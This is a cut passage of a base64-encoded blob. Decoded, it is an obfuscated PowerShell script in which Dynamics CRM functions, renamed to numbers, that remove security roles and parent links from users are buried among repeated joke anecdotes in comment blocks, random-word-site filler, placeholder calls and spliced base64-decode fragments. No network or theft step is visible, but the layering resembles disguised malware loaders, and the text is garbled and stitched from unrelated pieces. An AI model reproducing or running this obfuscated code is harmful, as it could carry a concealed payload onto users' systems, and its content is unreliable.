BhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGYoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgRGVkaWNhdGlvblNvdXJjZSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGEoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gMjZ7CgoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9IkNybVJlY29yZCIpXQogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJDcm1SZWNvcmRSb2xlTmFtZSIpXQogICAgICAgIFtQU09iamVjdF0kVXNlclJlY29yZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MiwgUGFyYW1ldGVyU2V0TmFtZT0iQ3JtUmVjb3JkIildCiAgICAgICAgW1BTT2JqZWN0XSRTZWN1cml0eVJvbGVSZWNvcmQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9IklkIildCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9IklkUm9sZU5hbWUiKV0KICAgICAgICBbc3RyaW5nXSRVc2VySWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIsIFBhcmFtZXRlclNldE5hbWU9IklkIildCiAgICAgICAgW3N0cmluZ10kU2VjdXJpdHlSb2xlSWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIsIFBhcmFtZXRlclNldE5hbWU9IkNybVJlY29yZFJvbGVOYW1lIildCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIsIFBhcmFtZXRlclNldE5hbWU9IklkUm9sZU5hbWUiKV0KICAgICAgICBbc3RyaW5nXSRTZWN1cml0eVJvbGVOYW1lCiAgICApCiAgICAKICAgICRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKCiAgICAjZW5zdXJlIHRoZSBidXNpbmVzc3VuaXRpZCBpcyBhdmFpbGFibGUgZm9yIHRoZSB1c2VyCiAgICBpZigtbm90ICRVc2VyUmVjb3JkIC1hbmQgJFVzZXJJZCAtbmUgJG51bGwpCiAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiR2V0dGluZyBVc2VyUmVjb3JkIGZvciBidXNpbmVzc3VuaXRpZCB3aXRoIFVzZXJJZCBwcm92aWRlZDogJFVzZXJJZCIKICAgICAgICAkVXNlclJlY29yZCA9IEdldC1Dcm1SZWNvcmQgLWNvbm4gJGNvbm4gLUVudGl0eUxvZ2ljYWxOYW1lIHN5c3RlbXVzZXIgLUlkICRVc2VySWQgLUZpZWxkcyBidXNpbmVzc3VuaXRpZAogICAgfQogICAgZWxzZWlmKCRVc2VyUmVjb3JkIC1uZSAkbnVsbCAtYW5kIC1ub3QgJFVzZXJSZWNvcmQuYnVzaW5lc3N1bml0aWQpCiAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiR2V0dGluZyBidXNpbmVzc3VuaXRpZCBmb3IgVXNlclJlY29yZCIKICAgICAgICAkVXNlclJlY29yZCA9IEdldC1Dcm1SZWNvcmQgLWNvbm4gJGNvbm4gLUVudGl0eUxvZ2ljYWxOYW1lIHN5c3RlbXVzZXIgLUlkICRVc2VyUmVjb3JkLlJldHVyblByb3BlcnR5X0lkIC1GaWVsZHMgYnVzaW5lc3N1bml0aWQKICAgIH0KICAgIGVsc2V7CiAgICAgICAgdGhyb3cgIlRoZSBVc2VySWQgY2Fubm90IGJlIGRldGVybWluZWQuIgogICAgfQogICAgCiAgICAjaWYgd2UgaGF2ZSBhIG5hbWUgYnV0IG5vIElEIHRoZW4gd2UgbXVzdCBnZXQgdGhlIHJvbGVpZAogICAgaWYoLW5vdCAkU2VjdXJpdHlSb2xlSWQgLWFuZCAkU2VjdXJpdHlSb2xlTmFtZSAtbmUgJG51bGwpCiAgICB7CiAgICAgICAgJGZldGNoPUAiCiAgICA8ZmV0Y2ggdmVyc2lvbj0iMS4wIiBvdXRwdXQtZm9ybWF0PSJ4bWwtcGxhdGZvcm0iIG1hcHBpbmc9ImxvZ2ljYWwiIGRpc3RpbmN0PSJmYWxzZSIgbm8tbG9jaz0idHJ1ZSI+CiAgICAgICAgPGVudGl0eSBuYW1lPSJyb2xlIj4KICAgICAgICA8YXR0cmlidXRlIG5hbWU9ImJ1c2luZXNzdW5pdGlkIiAvPgogICAgICAgIDxhdHRyaWJ1dGUgbmFtZT0icm9sZWlkIiAvPgogICAgICAgIDxhdHRyaWJ1dGUgbmFtZT0ibmFtZSIgLz4KICAgICAgICA8ZmlsdGVyIHR5cGU9ImFuZCI+CiAgICAgICAgICAgIDxjb25kaXRpb24gYXR0cmlidXRlPSJuYW1lIiBvcGVyYXRvcj0iZXEiIHZhbHVlPSJ7MH0iIC8+CiAgICAgICAgICAgIDxjb25kaXRpb24gYXR0cmlidXRlPSJidXNpbmVzc3VuaXRpZCIgb3BlcmF0b3I9ImVxIiB2YWx1ZT0iezF9IiAvPgogICAgICAgIDwvZmlsdGVyPgogICAgICAgIDwvZW50aXR5PgogICAgPC9mZXRjaD4KIkAgLUYgJFNlY3VyaXR5Um9sZU5hbWUsICRVc2VyUmVjb3JkLmJ1c2luZXNzdW5pdGlkX1Byb3BlcnR5LlZhbHVlLklkCiAgICAKICAgICAgICAkcm9sZXMgPSAoR2V0LUNybVJlY29yZHNCeUZldGNoIC1jb25uICRjb25uIC1GZXRjaCAkZmV0Y2gpCiAgICAgICAgaWYoJHJvbGVzLkNybVJlY29yZHMuQ291bnQgLWVxIDApCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyAiTm8gU2VjdXJpdHkgUm9sZSBmb3VuZCBmb3Igcm9sZW5hbWUgJFNlY3VyaXR5Um9sZU5hbWUiCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRTZWN1cml0eVJvbGVSZWNvcmQgPSAkcm9sZXMuQ3JtUmVjb3Jkc1swXQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJGb3VuZCBSb2xlIHdpdGggSUQ6ICQoJHJvbGUuUmV0dXJuUHJvcGVydHlfSWQpIGFuZCBuYW1lOiAkKCRTZWN1cml0eVJvbGVSZWNvcmQubmFtZSkiCiAgICAgICAgfQogICAgfQoKICAgIGlmKCRVc2VyUmVjb3JkIC1hbmQgJFNlY3VyaXR5Um9sZVJlY29yZCkKICAgIHsKICAgICAgICBXcml0ZS1WZXJib3NlICgiUmVtb3Zpbmcgcm9sZSBmcm9tIHVzZXIiKQogICAgICAgIFJlbW92ZS1Dcm1SZWNvcmRBc3NvY2lhdGlvbiAtY29ubiAkY29ubiAtQ3JtUmVjb3JkMSAkVXNlclJlY29yZCAtQ3JtUmVjb3JkMiAkU2VjdXJpdHlSb2xlUmVjb3JkIC1SZWxhdGlvbnNoaXBOYW1lIHN5c3RlbXVzZXJyb2xlc19hc3NvY2lhdGlvbgogICAgfQogICAgZWxzZWlmKCRVc2VySWQgLWFuZCAkU2VjdXJpdHlSb2xlSWQpCiAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAoIlJlbW92aW5nIHJvbGUgZnJvbSB1c2VyIikKICAgICAgICBSZW1vdmUtQ3JtUmVjb3JkQXNzb2NpYXRpb24gLWNvbm4gJGNvbm4gLUVudGl0eUxvZ2ljYWxOYW1lMSBzeXN0ZW11c2VyIC1JZDEgJFVzZXJJZCAtRW50aXR5TG9naWNhbE5hbWUyIHJvbGUgLUlkMiAkU2VjdXJpdHlSb2xlSWQgLVJlbGF0aW9uc2hpcE5hbWUgc3lzdGVtdXNlcnJvbGVzX2Fzc29jaWF0aW9uCiAgICB9CiAgICBlbHNlewogICAgICAgIHRocm93ICJSb2xlIHJlbW92YWwgY291bGQgbm90IGJlIGNvbXBsZXRlZCB3aXRoIHRoZSBwcm92aWRlZCBpbnB1dHMiCiAgICB9Cn0KPCM+PgpTcD1lbGxpbmcgYW5kIGQoKQpUaGlzIHRvb2wgY2FuIGJlIGFuIGV4Y2VsbGVudCB3YXkgdG8gaW1wcm92ZSBkKCkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBhKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGEoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gaCgpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBnKCkgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBhKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIDI3ewoKIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSggCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xKV0KICAgICAgICBbZ3VpZF0kVXNlcklkCiAgICApCgoJJGNvbm4gPSBWZXJpZnlDcm1Db25uZWN0aW9uUGFyYW0gLWNvbm4gJGNvbm4gLXBpcGVsaW5lVmFsdWUgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnY29ubicpKQoKICAgICRyZXF1ZXN0ID0gTmV3LU9iamVjdCAnTWljcm9zb2Z0LkNybS5TZGsuTWVzc2FnZXMuUmVtb3ZlUGFyZW50UmVxdWVzdCcKICAgICR0YXJnZXQgPSBOZXctQ3JtRW50aXR5UmVmZXJlbmNlIHN5c3RlbXVzZXIgJFVzZXJJZAogICAgJHJlcXVlc3QuVGFyZ2V0ID0gJHRhcmdldAogICAgCiAgICB0cnkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJGNvbm4uRXhlY3V0ZUNybU9yZ2FuaXphdGlvblJlcXVlc3QoJHJlcXVlc3QsICRudWxsKQoJCWlmKCRyZXN1bHQgLWVxICRudWxsKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgTGFzdENybUNvbm5lY3RvckV4Y2VwdGlvbigkY29ubikKICAgICAgICB9CiAgICB9CiAgICBjYXRjaAogICAgewogICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICB9IAp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBkKCkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgZCgpIG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNy